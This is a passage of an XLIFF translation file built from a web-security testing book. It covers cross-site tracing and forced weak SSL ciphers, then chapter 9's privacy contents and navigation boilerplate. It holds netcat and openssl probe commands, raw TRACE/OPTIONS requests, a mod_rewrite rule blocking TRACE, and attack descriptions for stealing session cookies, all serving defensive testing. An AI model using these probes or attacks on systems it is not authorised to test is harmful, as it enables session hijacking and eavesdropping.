          <source>Intended as a mechanism to help debug connections, a server that responds to TRACE requests echoes whatever it has sent back to the client. In certain cases, though, more information may be sent than intended. Within browsers, because cookies are automatically included in HTTP requests for the domain they were set in, a TRACE request would also echo all the cookie values. If an attacker can leverage this, he can bypass the client-side HTTP-only protection (discussed in the cross-site scripting attack in &lt;a class="docLink" href="ch05.html#ch05"&gt;Chapter 5&lt;/a&gt;, &amp;quot;Attacking User-Supplied Input Data&amp;quot;), which simply restricts a client-side script from accessing cookies via the Document Object Model (DOM). In addition, if some form of HTTP authentication was performed (like it was earlier), usernames and passwords may be discovered. In certain cases, though, more information than intended can be sent, as shown in &lt;a class="docLink" href="#ch08fig06"&gt;Figure 8-6&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-6. A cross-site tracing example with embedded authorization string.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An important part of this attack is that it negates the need for an XSS (or any kind of client-side scripting) vulnerability to exist on the target application (the target server only has to support HTTP TRACE), and for the victim to visit a site that has a cross-site tracing vulnerability.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, it's not as simple as it sounds; browsers and scripting languages do not support HTTP methods other than &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt;. The attacker, therefore, has to find some other way of making the required request. Extended client-side scripting technologies like ActiveX, Flash, Java, and so forth, have functionality which allow programmatic access to creating and sending raw HTTP requests.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To achieve this, an attacker has to find a place that is susceptible to cross-site scripting (the place has to have a vector to introduce the malicious code), for the victim to have extended client-side scripting technologies (Microsoft ships a version of the XMLHTTP ActiveX control with all installations), and to trick the user into visiting the malicious site. An outline of the attack is shown in &lt;a class="docLink" href="#ch08fig07"&gt;Figure 8-7&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-7. Overview of the cross-site tracing attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack may seem unlikely, but the payoff to the attacker could be worth the gamble. The attacker obtains the victim's session identifiers and can masquerade as them on the target application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As mentioned earlier, this attack becomes possible when the server accepts the HTTP TRACE method, or your application or someone else's has an XSS vulnerability. Checking for the first condition is straightforward, as we will discuss next. However, the second condition is much harder to discover your susceptibility to, even if you only consider your own application(s).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The introduction to this attack gives the overall operations necessary to understand how it works. For a more detailed description, including exploit code, see &lt;a class="docLink" target="_blank" href="http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf"&gt;http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There is, however, a much easier way to see if users of your application could be susceptible to a cross-site tracking attack. Using Netcat or another command-line tool, connect to the Web server with the following command:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>nc www.example.com 80</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This assumes that the server will communicate over clear HTTP, which is usual for home pages that do not require authentication. If this is not the case, you can use OpenSSL instead:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>openssl s_client -connect www.example.com:443</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Either way, you should have a connection to the Web server that is waiting for your HTTP request. Now send an &lt;tt&gt;OPTIONS&lt;/tt&gt; request to see what HTTP methods the server supports:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>OPTIONS / HTTP/1.0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If one of the available listed methods is TRACE, you should turn it off in the Web server's configuration file. This will not protect against the XSS attack vector because it could exist in your own application or on some other remote host, but it does stop attackers from obtaining information from cross-site tracing. If you do not see TRACE listed, or you receive a HTTP 400 or 405 error message (method not allowed) for the &lt;tt&gt;OPTIONS&lt;/tt&gt; request, reconnect to the Web server and try the following request:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>TRACE / HTTP/1.0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>That request ensures that TRACE is turned off.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many browsers have strong cross-domain protection that stops one site from performing requests for another. This means that XSS vulnerabilities on other sites launching cross-site tracing attacks are slowly being mitigated as people upgrade to newer browser versions. This doesn't fully solve the issue, though. A cross-site tracing vulnerability on your own site can still gather authentication tokens because they are in the same domain. Err on the side of caution, and turn off TRACE requests.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can simply and safely turn off the TRACE HTTP method from all Web servers. On Apache, the following change in the configuration file using &lt;tt&gt;mod_rewrite&lt;/tt&gt; will disable these requests:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>RewriteEngine On
RewriteCond %{REQUEST_METHOD}  ^TRACE
RewriteRule .* - [F]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you're using Internet Information Server, you can turn off TRACE using URLScan and ensuring it is not in the AllowVerbs section in the &lt;tt&gt;urlscan.ini&lt;/tt&gt; file. Be sure also to turn off the nonstandard TRACK method because it offers similar functionality.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 24 Forcing Weak Cryptography</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To protect against eavesdropping of sensitive data (for example, credit card numbers) and the growing need for security, Netscape proposed the addition of Secure Sockets Layers (SSL) in 1994, which became more widely known as HTTPS (HTTP over Secure sockets). Providing both confidentiality and integrity of communications between server and browsers, HTTPS kicked off the widespread growth of e-commerce on the Web.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SSL uses public key cryptography to form an initial connection using either RSA or Diffe-Hellman algorithms. Then the browser and server negotiate a method to exchange a common key that all subsequent communications are to be encrypted with. This fallback from an asynchronous cryptographic system (one with different encryption and decryption keys) to a synchronous system (one with shared keys between all parties) is common because of performance issues with multikey cryptography. Using a single key is much quicker if you can exchange that key securely in the first place.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Due to the number of different types of browsers that people use to surf the Internet, SSL provides a list of cryptographic methods that the server can support and that the browser should pick from to perform the key exchange (&lt;a class="docLink" href="#ch08fig08"&gt;Figure 8-8&lt;/a&gt;). This is known as the &lt;span class="docEmphStrong"&gt;cipher suite&lt;/span&gt;. After the browser chooses a method, SSL encrypts the shared key and sends it to the browser for further use (&lt;a class="docLink" href="#ch08fig09"&gt;Figure 8-9&lt;/a&gt;). The intention is that the browser should pick the strongest method, but often there are weak options that are easily broken.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-8. Capture of network packets with a browser providing all the possible ciphers it can support.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-9. The server picks the strongest available cipher.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In version 2 of SSL, there is no notion of integrity checking on this cipher suite exchange. If an attacker were to be able to intercept network traffic and remove options from the cipher suite or change key lengths, he could select a weaker key than was available. The attacker could then capture network traffic and target the weak encryption, with the end user being none the wiser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Netscape fixed these flaws in version 3 of the Secure Sockets Layer, which went on to become TLS (Transport Layer Security) version 1.0, an IETF standard protocol first defined in RFC 2246. When you're using SSL V.3, an attacker cannot easily modify the cipher suite without the browser knowing about it. The server can still have various key exchange methods available, which the browser may inadvertently choose, perhaps through misconfiguration (early browser versions were only able to use 40-bit encryption because of U.S. Government export restrictions), or a Trojan program. With the advances in computer processing power, many of the weaker schemes can be broken in reasonable time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because this attack is only against SSL, it makes sense to try this attack only on Web applications that use SSL. This attack is really only necessary when it is protecting data that is more long-lived and sensitive than session identifiers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Even if the attack is successful, it can still take a reasonable amount of time to break the encryption. If other recommendations that we gave for protecting and securing session identifiers against reuse are observed (see &lt;a class="docLink" href="ch04lev1sec2.html#ch04lev2sec5"&gt;Attack 10&lt;/a&gt; of &lt;a class="docLink" href="ch04.html#ch04"&gt;Chapter 4&lt;/a&gt;, &amp;quot;State-Based Attacks&amp;quot;), then the session ID should be invalid long before the encryption is broken.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Various policies set forth by companies like Visa and MasterCard in their joint Cardholder Information Security Program (CISP) mandate that any time credit card information is transmitted, a minimum of 128-bit encryption is used. HIPPA has a similar requirement, although it does not specify a key length. Because the overhead of using longer keys is negligible, you may as well remove all 40- and 56-bit encryption schemes as options.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use Ethereal to see the cipher suite that is being negotiated and the final encryption scheme that is being chosen, as discussed earlier. A much simpler method is to use Foundstone's free SSLDigger tool. This tool tests for 26 commonly used ciphers (although you can import additional ones so ensure that you have the most up-to-date version) by initiating connections to the server with each cipher. Although this is not as efficient a method as looking at the cipher suite, it does ensure that no false positive or false negative results are reported, and in practice the time taken to test all combinations rarely takes longer than a few minutes. SSLDigger produces a report of all ciphers attempted, with their raw data, and gives the site a grade based on the number and strength of the encryption available. A much simpler method is to use Foundstone's free SSLDigger tool (see &lt;a class="docLink" href="#ch08fig10"&gt;Figure 8-10&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-10. SSLDigger showing the cipher strengths supported on &lt;a class="docLink" target="_blank" href="http://Amazon.com"&gt;Amazon.com&lt;/a&gt;. The server provides some excellent encryption options but also has some weaker ones available to support older browsers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first and most important thing to do is to check that the server uses SSL version 3 or above. A simple way of testing for this is to force the browser to use SSL version 2 in the Tools, Internet Options, Advanced configuration settings of Internet Explorer.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-11. Configuring Internet Explorer to use only SSL version 2.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Remove weak ciphers from the server unless there is good reason to support them (such as the requirement to support browsers below version 4 in Internet Explorer or Netscape). In the past, if a company wanted to do business over the Internet with countries outside of the United States and still use strong encryption, it could do so by using a Server Gated Cryptography (SGC) certificate which enabled strong cryptography within a browser. However, obtaining these certificates was complicated and expensive. This, however, was before the lifting of export restrictions of cryptography by the U.S. Government in 2000. SGC now serves only to confuse things and is no longer necessary. (Most of these old certificates have expired anyway.) However, if SGC is still used, it can force browsers to use 40- or 56-bit encryption when higher bit lengths are available. That's why it is advisable to remove these certificates and all weak cipher options.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In Apache, removing unwanted ciphers from consideration involves finding the SSLCipherSuite directive in the server's configuration file and deleting ciphers from the colon-separated list. You can find more details in either the Apache &amp;quot;How-To&amp;quot; document (&lt;a class="docLink" target="_blank" href="http://httpd.apache.org/docs/2.0/ssl/ssl_howto.html"&gt;http://httpd.apache.org/docs/2.0/ssl/ssl_howto.html&lt;/a&gt;) or in the documentation for mod_ssl (&lt;a class="docLink" target="_blank" href="http://www.modssl.org/docs/2.8/"&gt;http://www.modssl.org/docs/2.8/&lt;/a&gt;). For Internet Information Server, the knowledge-base article 245030 (&lt;a class="docLink" target="_blank" href="http://support.microsoft.com/?kbid=245030"&gt;http://support.microsoft.com/?kbid=245030&lt;/a&gt;) discusses how to modify the registry to remove ciphers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch08lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>http://usa.visa.com/download/business/accepting_visa/ops_risk_management/cisp_PCI_Data_Security_Standard.pdf</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>http://en.wikipedia.org/wiki/Frequency_analysis</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>http://en.wikipedia.org/wiki/RC4</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>http://en.wikipedia.org/wiki/Vernam_cipher</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>http://usa.visa.com/business/accepting_visa/ops_risk_management/cisp.html</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>http://www.hipaa.org/</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 9. Privacy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 9. Privacy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>User Agents</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Referrer</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Cookies</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Web Bugs</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Clipboard Access</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Caching Pages</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>ActiveX Controls</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Browser Helper Objects</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter departs from the &amp;quot;attack&amp;quot; format of previous chapters because it is material of a more general nature that is of a larger concern than just software testing. The topic here is privacy&amp;mdash;a subject that will be gaining even more attention in the future due to public concern over identity theft and the enactment of laws protecting individual privacy rights.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you are working on Web applications, the privacy of your users and their data should be foremost in your mind.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch09lev1sec10.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Browser Helper Objects</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch09lev1sec9.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
